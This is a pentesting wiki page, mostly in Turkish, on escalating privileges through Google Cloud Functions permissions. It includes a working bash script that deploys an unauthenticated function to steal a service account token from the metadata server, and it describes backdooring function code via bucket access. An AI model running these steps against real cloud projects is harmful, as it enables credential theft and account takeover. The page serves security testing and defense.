# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Cloud Functions hakkında daha fazla bilgi:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Bu ayrıcalıklara sahip bir saldırgan **rastgele (kötü amaçlı) kod içeren yeni bir Cloud Function oluşturup bir Service Account atayabilir**. Ardından metadata'dan Service Account token'ını leak ederek bu hesaba ayrıcalık yükseltmesi yapabilir.  
Fonksiyonu tetiklemek için bazı ayrıcalıklar gerekebilir.

Exploit scripts for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) and [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) and the prebuilt .zip file can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Bu ayrıcalıklara sahip bir saldırgan **bir Function'ın kodunu değiştirebilir ve hatta iliştirilmiş service account'u değiştirerek token'ı exfiltrating etmeyi amaçlayabilir**.

> [!CAUTION]
> Cloud functions deploy etmek için varsayılan compute service account üzerinde veya imajı oluşturmak için kullanılan service account üzerinde actAs izinlerine de ihtiyacınız olacaktır.

Bazı ek ayrıcalıklar, örneğin versiyon 1 cloudfunctions için `.call` izni veya fonksiyonu tetiklemek için `role/run.invoker` rolü gerekebilir.

<details><summary>Cloud Function'ı kötü amaçlı kodla güncelleyerek service account token'ını exfiltrate etme</summary>
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
</details>

> [!CAUTION]
> Eğer `Permission 'run.services.setIamPolicy' denied on resource...` hatası alıyorsanız bunun nedeni `--allow-unauthenticated` parametresini kullanıyor olmanız ve bunun için yeterli izne sahip olmamanızdır.

The exploit script for this method can be found [burada](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Bu izin ile bir function bucket'a dosya yükleyebilmek için **signed URL** alabilirsiniz (ancak fonksiyonun kodu değişmeyecek, yine de güncellemeniz gerekir)

<details><summary>Cloud Function için signed upload URL oluştur</summary>
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
</details>

Tek başına bu iznin bir attacker açısından ne kadar faydalı olduğundan tam olarak emin değilim, ama bilmek iyi.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Kendinize yükseltme yapmak için önceki herhangi bir **`.update`** veya **`.create`** ayrıcalığını verin.

### `cloudfunctions.functions.update`

Sadece **`cloudfunctions`** izinlerine sahip olup **`iam.serviceAccounts.actAs`** yoksa function'ı güncelleyemeyeceksiniz, YANİ BU GEÇERLİ BİR PRIVESC DEĞİL.

### Read & Write Access over the bucket

Bucket üzerinde read ve write erişiminiz varsa koddaki değişiklikleri izleyebilir ve bir **bucket'ta bir update olduğunda yeni kodu kendi kodunuzla güncelleyebilirsiniz**; böylece Cloud Function'ın yeni sürümü gönderilmiş backdoored kod ile çalışacaktır.

You can check more about the attack in:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Ancak, bu yöntemi üçüncü taraf Cloud Functions'ları önceden ele geçirmek için kullanamazsınız çünkü bucket'ı kendi hesabınızda oluşturup dış projeye yazma izni verirseniz şu hatayı alırsınız:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> Ancak, bu DoS saldırıları için kullanılabilir.

### Read & Write Access over Artifact Registry

Bir Cloud Function oluşturulduğunda proje Artifact Registry'sine yeni bir docker image push edilir. Görüntüyü yenisiyle değiştirmeye, hatta mevcut image'i (ve `cache` image'ini) silmeye çalıştım ve hiçbir şey değişmedi, cloud function çalışmaya devam etti. Bu yüzden, bucket ile olduğu gibi çalıştırılacak docker container'ı değiştirmek için bir Race Condition attack abuse etmek mümkün olabilir ama sadece saklanan image'i değiştirmek Cloud Function'ı ele geçirmek için yeterli değildir.

## References

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
